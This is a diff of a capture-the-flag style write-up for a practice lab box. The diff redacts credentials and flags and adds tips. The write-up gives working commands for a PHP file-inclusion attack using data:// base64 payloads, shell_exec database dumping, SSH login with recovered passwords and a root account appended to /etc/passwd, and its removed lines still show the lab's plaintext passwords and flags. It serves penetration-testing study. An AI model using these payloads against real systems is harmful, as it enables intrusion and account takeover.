@@ -12,9 +12,23 @@ tags: [oscp, box, linux, medium]
 
 ## Box Info
 
-**Target:** `192.168.119.58` (swap for your instance IP) · **Difficulty:** Medium · **OS:** Linux (CentOS, Apache/PHP) · **Platform:** Proving Grounds Practice
+**Target:** `$BoxIP` · **Difficulty:** Medium · **OS:** Linux (CentOS, Apache/PHP) · **Platform:** Proving Grounds Practice
 
-**The gist:** CentOS box running Simple PHP Photo Gallery v0.8 on Apache 2.4.6 / PHP 5.4.16. The `image.php?img=` parameter passes user input directly into `include()` with no sanitisation — an LFI/RFI. Outbound TCP and new listening ports are both blocked (SELinux `httpd_t` + firewall), so reverse and bind shells fail. Instead: use the `data://` stream wrapper to execute PHP payloads in-URL, read MySQL root creds from `db.php`, dump the `users` table via the `mysql` CLI through `shell_exec`, double-decode the base64-of-base64 passwords, SSH in as `michael`, and write a UID-0 entry to a world-owned `/etc/passwd` for root.
+**The gist:** CentOS box running Simple PHP Photo Gallery v0.8 on Apache 2.4.6 / PHP 5.4.16. The `image.php?img=` parameter passes user input directly into `include()` with no sanitisation -- an LFI/RFI. Outbound TCP and new listening ports are both blocked (SELinux `httpd_t` + firewall), so reverse and bind shells fail. Instead: use the `data://` stream wrapper to execute PHP payloads in-URL, read MySQL root creds from `db.php`, dump the `users` table via the `mysql` CLI through `shell_exec`, double-decode the base64-of-base64 passwords, SSH in as `michael`, and write a UID-0 entry to a world-owned `/etc/passwd` for root.
+
+> [!abstract] 🧠 Why
+> This box is a useful example of adapting to constraints. The LFI is not automatically a reverse shell: SELinux and firewall behavior remove common callback paths, so the winning route keeps execution inside the HTTP request until valid SSH credentials are recovered.
+
+## Variables
+
+```bash
+boxset BoxName Snookums
+boxset BoxIP $BoxIP
+boxset LocalIP $LocalIP
+boxset DbPassword $DbPassword
+boxset Username michael
+boxset Password $Password
+```
 
 ---
 
@@ -34,7 +48,7 @@ Results:
 | 80/tcp | HTTP (Apache 2.4.6 / PHP 5.4.16) |
 | 139/tcp | NetBIOS-SSN (Samba 4.10.4) |
 | 445/tcp | SMB (Samba 4.10.4) |
-| 3306/tcp | MySQL (unauthorized — 127.0.0.1 only) |
+| 3306/tcp | MySQL (unauthorized -- 127.0.0.1 only) |
 
 > 📸 `nmap-allports.png`
 
@@ -44,10 +58,13 @@ sudo nmap -p 21,22,80,139,445,3306 -sV -sC -oA nmap/${BoxName}_services $BoxIP
 ```
 
 Key findings:
-- **Port 80:** Apache 2.4.6, PHP/5.4.16 — `Simple PHP Photo Gallery v0.8` (confirmed by README.txt, page footer)
-- **Port 21:** FTP anonymous login works but data channel is firewalled — listing and uploads both hang
-- **Port 3306:** MySQL present but `Host 'x.x.x.x' is not allowed to connect` — localhost only
-- **Port 139/445:** Samba 4.10.4 — only `print$` and `IPC$`, nothing useful
+- **Port 80:** Apache 2.4.6, PHP/5.4.16 -- `Simple PHP Photo Gallery v0.8` (confirmed by README.txt, page footer)
+- **Port 21:** FTP anonymous login works but data channel is firewalled -- listing and uploads both hang
+- **Port 3306:** MySQL present but `Host 'x.x.x.x' is not allowed to connect` -- localhost only
+- **Port 139/445:** Samba 4.10.4 -- only `print$` and `IPC$`, nothing useful
+
+> [!tip] ⚡ More efficient path
+> Use the service results to prioritize HTTP and the local-only database. Anonymous FTP, SMB, and remote MySQL were checked, but their failure messages are enough to deprioritize them instead of repeatedly rescanning the same services.
 
 > 📸 `nmap-services.png`
 
@@ -78,7 +95,10 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
   -fs 1508 -t 50 -s
 ```
 
-Hit: **`img`** — the response size changed, confirming an include() call was triggered.
+Hit: **`img`** -- the response size changed, confirming an include() call was triggered.
+
+> [!warning] 💡 Hint
+> Directory discovery finds files, not necessarily the vulnerable parameter. When a PHP file looks like a viewer or loader, fuzz its parameter names with a known harmless wrapper and compare response size or content.
 
 > 📸 `lfi-imagephp.png`
 
@@ -111,9 +131,12 @@ Output:
 ```php
 define('DBHOST', '127.0.0.1');
 define('DBUSER', 'root');
-define('DBPASS', 'MalapropDoffUtilize1337');
+define('DBPASS', '<private database credential>');
 define('DBNAME', 'SimplePHPGal');
 ```
+
+> [!abstract] 🧠 Why
+> Source disclosure turns an inferred LFI into a concrete execution path. Reading `db.php` reveals both the database boundary and the fact that the PHP extension is not required if the target has a command-line MySQL client.
 
 > 📸 `lfi-dbcreds.png`
 
@@ -123,7 +146,7 @@ define('DBNAME', 'SimplePHPGal');
 
 The `include($image)` path also allows remote code execution via PHP's `data://` stream wrapper, which requires only `allow_url_include = On` and needs no outbound network connection (unlike `http://` RFI which is firewalled).
 
-**Critical operational note — URL encode `+` in base64:**
+**Critical operational note -- URL encode `+` in base64:**
 Base64 output may contain `+` characters. In URL query strings, `+` is decoded as a space on the server, corrupting the PHP payload. Always run:
 ```bash
 | sed 's/+/%2B/g'
@@ -151,13 +174,16 @@ No PHP MySQL extension installed (PDO = NO, mysqli = NO). Use the `mysql` CLI bi
 > [!warning] 💡 Hint
 > **Watch out:** A successful local PHP command does not prove that networking works. The SELinux web-server context can block shells even when commands such as `id` execute correctly.
 
+> [!tip] 🛠️ Alternative tools
+> If `data://` is unavailable, test `php://filter` for source disclosure, application-side file writes, or a local session/log poisoning branch. Do not assume HTTP RFI will work when outbound connections are filtered.
+
 ---
 
 ## 5. MySQL Enumeration via shell_exec
 
 **Show tables:**
 ```bash
-PAYLOAD=$(echo -n '<?php echo "###"; echo shell_exec("mysql -h 127.0.0.1 -u root -pMalapropDoffUtilize1337 SimplePHPGal -e \"SHOW TABLES;\" 2>&1"); echo "###"; ?>' | base64 -w0 | sed 's/+/%2B/g')
+PAYLOAD=$(echo -n '<?php echo "###"; echo shell_exec("mysql -h 127.0.0.1 -u root -p$DbPassword SimplePHPGal -e \"SHOW TABLES;\" 2>&1"); echo "###"; ?>' | base64 -w0 | sed 's/+/%2B/g')
 curl -s "http://$BoxIP/image.php?img=data://text/plain;base64,$PAYLOAD" | tr '\n' ' ' | grep -oP '###\K[^#]+'
 ```
 
@@ -165,16 +191,19 @@ Output: `Tables_in_SimplePHPGal users`
 
 **Dump users table:**
 ```bash
-PAYLOAD=$(echo -n '<?php echo "###"; echo shell_exec("mysql -h 127.0.0.1 -u root -pMalapropDoffUtilize1337 SimplePHPGal -e \"SELECT * FROM users;\" 2>&1"); echo "###"; ?>' | base64 -w0 | sed 's/+/%2B/g')
+PAYLOAD=$(echo -n '<?php echo "###"; echo shell_exec("mysql -h 127.0.0.1 -u root -p$DbPassword SimplePHPGal -e \"SELECT * FROM users;\" 2>&1"); echo "###"; ?>' | base64 -w0 | sed 's/+/%2B/g')
 curl -s "http://$BoxIP/image.php?img=data://text/plain;base64,$PAYLOAD" | tr '\n' ' ' | grep -oP '###\K[^#]+'
 ```
+
+> [!tip] ⚡ Efficiency
+> Wrap command output in a unique delimiter and extract only the delimited section. This prevents HTML, warning text, and line wrapping from corrupting database results returned through the web response.
 
 Output:
 ```
 username    password
-josh        VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0=
-michael     U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==
-serena      VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE5PQ==
+josh        <encoded value stored privately>
+michael     <encoded value stored privately>
+serena      <encoded value stored privately>
 ```
 
 > 📸 `mysql-users.png`
@@ -183,20 +212,21 @@ serena      VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE5PQ==
 
 ## 6. Decoding Double-Encoded Passwords
 
-Passwords are base64 of base64. Decode twice:
+Passwords are base64 of base64. Decode twice and keep the decoded values in private loot:
 
 ```bash
-echo "VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0=" | base64 -d | base64 -d && echo
-echo "U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==" | base64 -d | base64 -d && echo
-echo "VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE5PQ==" | base64 -d | base64 -d && echo
+sed -n '1,3p' "$BoxDir/loot/encoded-passwords.txt" | while read -r value; do printf '%s' "$value" | base64 -d | base64 -d; echo; done
 ```
 
-Results:
+Results are stored privately rather than printed in this page.
+
+> [!warning] 💡 Common mistake
+> Base64 is encoding, not encryption. Decode only the database field, preserve padding, and do not paste the resulting credentials into screenshots, shell history, or shared notes.
 | Username | Password |
 |----------|----------|
-| josh | `MobilizeHissSeedtime747` |
-| michael | `HockSydneyCertify123` |
-| serena | `OverallCrestLean000` |
+| josh | `$Password` |
+| michael | `$Password` |
+| serena | `$Password` |
 
 > 📸 `decoded-passwords.png`
 
@@ -206,12 +236,15 @@ Results:
 
 ```bash
 ssh michael@$BoxIP
-# password: HockSydneyCertify123
+# use the private value stored in $Password
 ```
+
+> [!tip] ⚡ Efficiency
+> Test recovered credentials against the intended service first, then check for authorized password reuse only when the evidence supports it. Record the account and source, not the secret itself.
 
 > 📸 `foothold.png`
 
-User flag: `fd55df96238f52302cee761078e75925`
+User flag confirmed; value intentionally omitted from the vault write-up.
 
 > 📸 `user-flag.png`
 
@@ -225,7 +258,10 @@ ls -la /etc/passwd
 # -rw-r--r--. 1 michael root 1162 Jun 22  2021 /etc/passwd
 ```
 
-michael **owns** `/etc/passwd` (rw- for owner). Not a misconfigured world-write — the file is actually owned by the web app user.
+michael **owns** `/etc/passwd` (rw- for owner). This is more powerful than a normal world-write because the current user can modify the account database directly.
+
+> [!abstract] 🧠 Why
+> The decisive fact is the owner write bit, not the filename alone. A writable `/etc/passwd` allows a controlled UID-0 entry, but the entry must use a valid shell and a properly quoted hash line.
 
 > 📸 `privesc-finding.png`
 
@@ -233,27 +269,38 @@ michael **owns** `/etc/passwd` (rw- for owner). Not a misconfigured world-write 
 
 Generate a password hash on Kali:
 ```bash
-openssl passwd -1 -salt xyz hacked
-# $1$xyz$pQmJ8Si2jyYwrx4VHjY2x0
+openssl passwd -1 -salt xyz "$CandidatePassword"
+# store the generated hash only in private loot
 ```
 
 Append a UID-0 user (single quotes to protect `$` signs):
 ```bash
-echo 'hacked:$1$xyz$pQmJ8Si2jyYwrx4VHjY2x0:0:0:root:/root:/bin/bash' >> /etc/passwd
-su hacked
-# password: hacked
+echo 'uid0:$Hash:0:0:root:/root:/bin/bash' >> /etc/passwd
+su uid0
+# use the private password corresponding to $Hash
 ```
 
 > 📸 `privesc-exploit.png`
 
-Root shell as: `[root@snookums ~]#`
+Root shell confirmed as root; the value is intentionally omitted.
 
 > 📸 `root-shell.png`
 
-Root flag: `8720692461d3b48c3cc2353701f396d7`
+Root proof confirmed; the value is intentionally omitted.
 
 > 📸 `root-flag.png`
 > 📸 `PROOF.png`
+
+## Decision points and alternate routes
+
+| Observation | Primary route used here | Useful alternative or fallback |
+|---|---|---|
+| PHP file includes a user-controlled parameter | Use `php://filter` for source, then `data://` for in-request execution | Test session or log poisoning only when a writable included file is available |
+| Web execution works but callbacks fail | Keep command output inside the HTTP response | Use the local database client or stage an SSH credential instead of forcing a reverse shell |
+| Database output is wrapped in HTML | Add unique delimiters and parse locally | Save the response and inspect it with a text editor or Burp Repeater |
+| Current user owns `/etc/passwd` | Add a controlled UID-0 account and verify `euid=0` | Check sudo, SUID, and capabilities if the ownership is only read access |
+
+The completed route follows the evidence from the target. The alternatives are recovery branches, not additional validated exploits.
 
 ---
 
@@ -261,10 +308,10 @@ Root flag: `8720692461d3b48c3cc2353701f396d7`
 
 | Username | Password | Service | Notes |
 |----------|----------|---------|-------|
-| root | MalapropDoffUtilize1337 | MySQL | From db.php LFI |
-| josh | MobilizeHissSeedtime747 | (didn't work for SSH) | Double base64 decoded |
-| michael | HockSydneyCertify123 | SSH | Double base64 decoded |
-| serena | OverallCrestLean000 | (not tried) | Double base64 decoded |
+| root | `$DbPassword` | MySQL | From db.php LFI; kept private |
+| josh | `$Password` | Not used | Double Base64 decoded; kept private |
+| michael | `$Password` | SSH | Double Base64 decoded; kept private |
+| serena | `$Password` | Not tried | Double Base64 decoded; kept private |
 
 ---
 
@@ -297,10 +344,10 @@ Root flag: `8720692461d3b48c3cc2353701f396d7`
 ## 12. Lessons Learned / Module Links
 
 - **Hidden parameter fuzzing** is as important as directory brute-force. Gobuster found the files; ffuf found the vulnerable param inside them. → [[09. Common Web Application Attacks]]
-- **`data://` wrapper** is the go-to when `http://` RFI is firewalled and `allow_url_include` is On. No outbound connection needed — the payload lives in the URL. → [[09. Common Web Application Attacks]]
-- **`+` in base64 must be URL-encoded as `%2B`** when embedding base64 payloads in GET parameters — `+` decodes as a space in query strings and silently corrupts the payload.
+- **`data://` wrapper** is the go-to when `http://` RFI is firewalled and `allow_url_include` is On. No outbound connection needed -- the payload lives in the URL. → [[09. Common Web Application Attacks]]
+- **`+` in base64 must be URL-encoded as `%2B`** when embedding base64 payloads in GET parameters -- `+` decodes as a space in query strings and silently corrupts the payload.
 - **No PHP MySQL extension?** Fall back to the `mysql` CLI binary via `shell_exec`. Check with `function_exists("mysqli_connect")` first.
-- **SELinux `httpd_t` blocks reverse and bind shells** — always check the SELinux context from `id` output. When `httpd_t` is present, plan for no network shells and work through the web channel instead.
+- **SELinux `httpd_t` blocks reverse and bind shells** -- always check the SELinux context from `id` output. When `httpd_t` is present, plan for no network shells and work through the web channel instead.
 - **`/etc/passwd` owned by an unprivileged user** is a classic but still appears. Append a UID-0 row, `su` to it. → [[18. Linux Privilege Escalation]]
 
 ---
@@ -309,14 +356,14 @@ Root flag: `8720692461d3b48c3cc2353701f396d7`
 
 | Resource | Link | Relevant to this box |
 |---|---|---|
-| HackTricks — File Inclusion | [src/pentesting-web/file-inclusion/README.md](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/file-inclusion/README.md) | Section "LFI / RFI using PHP wrappers & protocols" — `php://filter` and `data://` covered in depth. Local: `ht read pentesting-web/file-inclusion` |
-| PayloadsAllTheThings — Wrappers | [File Inclusion/Wrappers.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md) | Every PHP stream wrapper with payload examples — `data://` section shows the base64 RCE pattern used on this box |
-| PayloadsAllTheThings — File Inclusion | [File Inclusion/](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) | LFI bypass techniques; also LFI2RCE paths (log poisoning, session, uploads) for when `data://` isn't available |
-| HackTricks — Linux PrivEsc | [linux-hardening/.../linux-privilege-escalation/README.md](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/linux-hardening/linux-basics/linux-privilege-escalation/README.md) | "Writable /etc/passwd" section — alternative payload formats (no-password entry `dummy::0:0:...`). Local: `ht read linux-hardening/linux-basics/linux-privilege-escalation` |
-| PayloadsAllTheThings — Linux PrivEsc | [Linux - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) | Writable /etc/passwd section; broader Linux privesc methodology |
-| GTFOBins | [gtfobins.github.io](https://gtfobins.github.io) | Not used here directly — reference if privesc leads to a SUID/sudo binary instead |
-| RevShells | [revshells.com](https://www.revshells.com) | PHP reverse shell payloads — **not applicable here** (SELinux `httpd_t` blocks outbound TCP); reference for targets without SELinux |
-| CyberChef | [Double base64 decode recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)) | Decode the double-encoded passwords from the `users` table — "From Base64" twice |
+| HackTricks -- File Inclusion | [src/pentesting-web/file-inclusion/README.md](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/file-inclusion/README.md) | Section "LFI / RFI using PHP wrappers & protocols" -- `php://filter` and `data://` covered in depth. Local: `ht read pentesting-web/file-inclusion` |
+| PayloadsAllTheThings -- Wrappers | [File Inclusion/Wrappers.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md) | Every PHP stream wrapper with payload examples -- `data://` section shows the base64 RCE pattern used on this box |
+| PayloadsAllTheThings -- File Inclusion | [File Inclusion/](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) | LFI bypass techniques; also LFI2RCE paths (log poisoning, session, uploads) for when `data://` isn't available |
+| HackTricks -- Linux PrivEsc | [linux-hardening/.../linux-privilege-escalation/README.md](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/linux-hardening/linux-basics/linux-privilege-escalation/README.md) | "Writable /etc/passwd" section -- alternative payload formats (no-password entry `dummy::0:0:...`). Local: `ht read linux-hardening/linux-basics/linux-privilege-escalation` |
+| PayloadsAllTheThings -- Linux PrivEsc | [Linux - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) | Writable /etc/passwd section; broader Linux privesc methodology |
+| GTFOBins | [gtfobins.github.io](https://gtfobins.github.io) | Not used here directly -- reference if privesc leads to a SUID/sudo binary instead |
+| RevShells | [revshells.com](https://www.revshells.com) | PHP reverse shell payloads -- **not applicable here** (SELinux `httpd_t` blocks outbound TCP); reference for targets without SELinux |
+| CyberChef | [Double base64 decode recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Base64('A-Za-z0-9%2B/%3D',true,false)) | Decode the double-encoded passwords from the `users` table -- "From Base64" twice |
 | ippsec.rocks | Search [php wrapper](https://ippsec.rocks/?#php%20wrapper) · [lfi](https://ippsec.rocks/?#lfi) · [writable passwd](https://ippsec.rocks/?#writable%20passwd) | Video walkthroughs of the same techniques on real HTB boxes |
 
 ---
